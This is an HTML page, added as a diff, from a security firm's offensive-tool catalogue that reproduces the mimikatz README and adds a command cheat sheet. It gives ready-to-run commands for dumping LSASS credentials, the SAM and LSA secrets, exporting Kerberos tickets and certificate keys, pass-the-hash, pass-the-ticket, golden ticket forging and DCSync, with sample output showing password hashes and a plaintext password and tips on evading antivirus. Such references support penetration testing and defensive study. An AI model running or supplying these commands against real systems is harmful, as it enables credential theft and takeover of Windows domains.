@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>mimikatz - Breachcraft Dev</title>
+<meta name="description" content="mimikatz is a tool I&#x27;ve made to learn C and make somes experiments with Windows security">
+<link rel="canonical" href="https://breachcraft.dev/tools/mimikatz/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">mimikatz</p>
+  <h1>mimikatz</h1>
+  <p class="lede">mimikatz is a tool I've made to learn C and make somes experiments with Windows security</p>
+  <h2>What it is</h2>
+<p><strong><code>mimikatz</code></strong> is a tool I've made to learn <code>C</code> and make somes experiments with Windows security.</p>
+<p>It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. <strong><code>mimikatz</code></strong> can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.</p>
+<pre><code>  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                    with  13 modules * * */
+
+
+mimikatz # privilege::debug
+Privilege '20' OK
+ 
+mimikatz # sekurlsa::logonpasswords
+ 
+Authentication Id : 0 ; 515764 (00000000:0007deb4)
+Session           : Interactive from 2
+User Name         : Gentil Kiwi
+Domain            : vm-w7-ult-x
+SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
+        msv :
+         [00000003] Primary
+         * Username : Gentil Kiwi
+         * Domain   : vm-w7-ult-x
+         * LM       : d0e9aee149655a6075e4540af1f22d3b
+         * NTLM     : cc36cf7a8514893efccd332446158b1a
+         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
+        tspkg :
+         * Username : Gentil Kiwi
+         * Domain   : vm-w7-ult-x
+         * Password : waza1234/
+...</code></pre>
+<p>But that's not all! <code>Crypto</code>, <code>Terminal Server</code>, <code>Events</code>, ... lots of informations in the GitHub Wiki <a href="https://github.com/gentilkiwi/mimikatz/wiki">https://github.com/gentilkiwi/mimikatz/wiki</a> or on <a href="https://blog.gentilkiwi.com">https://blog.gentilkiwi.com</a> (in French, _yes_).</p>
+<p>If you don't want to build it, binaries are availables on <a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<h3>Quick usage</h3>
+<pre><code>log
+privilege::debug</code></pre>
+<h4>sekurlsa</h4>
+<pre><code>sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd</code></pre>
+<h4>kerberos</h4>
+<pre><code>kerberos::list /export
+kerberos::ptt c:\chocolate.kirbi
+
+kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi</code></pre>
+<h4>crypto</h4>
+<pre><code>crypto::capi
+crypto::cng
+
+crypto::certificates /export
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+
+crypto::keys /export
+crypto::keys /machine /export</code></pre>
+<h4>vault &amp; lsadump</h4>
+<pre><code>vault::cred
+vault::list
+
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local</code></pre>
+<h3>Build</h3>
+<p><code>mimikatz</code> is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:</p>
+<ul>
+<li>for <code>mimikatz</code> and <code>mimilib</code> : Visual Studio 2010, 2012 or 2013 for Desktop (<strong>2013 Express for Desktop is free and supports x86 &amp; x64</strong> - <a href="http://www.microsoft.com/download/details.aspx?id=44914">http://www.microsoft.com/download/details.aspx?id=44914</a>)</li>
+<li>_for <code>mimikatz driver</code>, <code>mimilove</code> (and <code>ddk2003</code> platform) : Windows Driver Kit <strong>7.1</strong> (WinDDK) - <a href="http://www.microsoft.com/download/details.aspx?id=11800_">http://www.microsoft.com/download/details.aspx?id=11800_</a></li>
+</ul>
+<p><code>mimikatz</code> uses <code>SVN</code> for source control, but is now available with <code>GIT</code> too! You can use any tools you want to sync, even incorporated <code>GIT</code> in Visual Studio 2013 =)</p>
+<h4>Synchronize!</h4>
+<ul>
+<li>GIT URL is  : <a href="https://github.com/gentilkiwi/mimikatz.git">https://github.com/gentilkiwi/mimikatz.git</a></li>
+<li>SVN URL is  : <a href="https://github.com/gentilkiwi/mimikatz/trunk">https://github.com/gentilkiwi/mimikatz/trunk</a></li>
+<li>ZIP file is : <a href="https://github.com/gentilkiwi/mimikatz/archive/master.zip">https://github.com/gentilkiwi/mimikatz/archive/master.zip</a></li>
+</ul>
+<h4>Build the solution</h4>
+<ul>
+<li>After opening the solution, <code>Build</code> / <code>Build Solution</code> (you can change architecture)</li>
+<li><code>mimikatz</code> is now built and ready to be used! (<code>Win32</code> / <code>x64</code> even <code>ARM64</code> if you're lucky)</li>
+<li>you can have error <code>MSB3073</code> about <code>_build_.cmd</code> and <code>mimidrv</code>, it's because the driver cannot be build without Windows Driver Kit <strong>7.1</strong> (WinDDK), but <code>mimikatz</code> and <code>mimilib</code> are OK.</li>
+</ul>
+<h4>ddk2003</h4>
+<p>With this optional MSBuild platform, you can use the WinDDK build tools, and the default <code>msvcrt</code> runtime (smaller binaries, no dependencies)</p>
+<p>For this optional platform, Windows Driver Kit <strong>7.1</strong> (WinDDK) - <a href="http://www.microsoft.com/download/details.aspx?id=11800">http://www.microsoft.com/download/details.aspx?id=11800</a> and Visual Studio <strong>2010</strong> are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.</p>
+<p>Follow instructions:</p>
+<ul>
+<li><a href="https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme">https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme</a></li>
+<li>_https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_</li>
+</ul>
+<h3>Continuous Integration</h3>
+<p><code>mimikatz</code> project is available on AppVeyor - <a href="https://ci.appveyor.com/project/gentilkiwi/mimikatz">https://ci.appveyor.com/project/gentilkiwi/mimikatz</a></p>
+<p>Its status is: </p>
+<h3>Licence</h3>
+<p>CC BY 4.0 licence - <a href="https://creativecommons.org/licenses/by/4.0/">https://creativecommons.org/licenses/by/4.0/</a></p>
+<p><code>mimikatz</code> needs coffee to be developed:</p>
+<ul>
+<li>PayPal: <a href="https://www.paypal.me/delpy/">https://www.paypal.me/delpy/</a></li>
+</ul>
+<h3>Author</h3>
+<ul>
+<li>Benjamin DELPY <code>gentilkiwi</code>, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )</li>
+<li>DCSync and DCShadow functions in <code>lsadump</code> module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( <a href="http://www.mysmartlogon.com">http://www.mysmartlogon.com</a> )</li>
+</ul>
+<p>This is a <strong>personal</strong> development, please respect its philosophy and don't use it for bad things!</p>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> Post-Exploitation Tool</li><li><strong>Purpose</strong> Windows credential extraction and manipulation</li><li><strong>Platform</strong> Windows</li><li><strong>Tags</strong> #windows #credentials #post-exploitation #lsass #kerberos #pass-the-hash</li></ul>
+<h3>Quick Reference</h3>
+<pre><code># Dump credentials
+privilege::debug
+sekurlsa::logonpasswords
+
+# Dump Kerberos tickets
+sekurlsa::tickets
+
+# Pass-the-Hash
+sekurlsa::pth /user:admin /domain:company.com /ntlm:&lt;hash&gt; /run:cmd
+
+# Golden Ticket
+kerberos::golden /user:admin /domain:company.com /sid:S-1-5-21-... /krbtgt:&lt;hash&gt;
+
+# DCSync
+lsadump::dcsync /domain:company.com /user:Administrator</code></pre>
+<h3>Common Commands</h3>
+<pre><code># Enable debug privilege
+privilege::debug
+
+# Dump credentials from LSASS
+sekurlsa::logonpasswords
+
+# Dump SAM database
+lsadump::sam
+
+# Export Kerberos tickets
+sekurlsa::tickets /export
+
+# DCSync (requires DC replication rights)
+lsadump::dcsync /user:krbtgt
+
+# Pass-the-Ticket
+kerberos::ptt ticket.kirbi</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Requires Admin</strong>: Most functions need local admin or SYSTEM 💡 <strong>AV Detection</strong>: Highly signatured by AV 💡 <strong>LSASS Dump</strong>: Can dump LSASS offline with other tools 💡 <strong>Golden Ticket</strong>: Requires krbtgt hash (DCSync or DC compromise) 💡 <strong>OPSEC</strong>: Consider alternatives (Dumpert, SafetyKatz, etc.)</p>
+<h3>Note</h3>
+<p>This is a Windows AD tool, included for comprehensive coverage. For Azure-focused operations, see AADInternals, ROADtools, TokenTactics.</p>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></li>
+<li>Author: @gentilkiwi (Benjamin Delpy)</li>
+<li>Wiki: <a href="https://github.com/gentilkiwi/mimikatz/wiki">https://github.com/gentilkiwi/mimikatz/wiki</a></li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
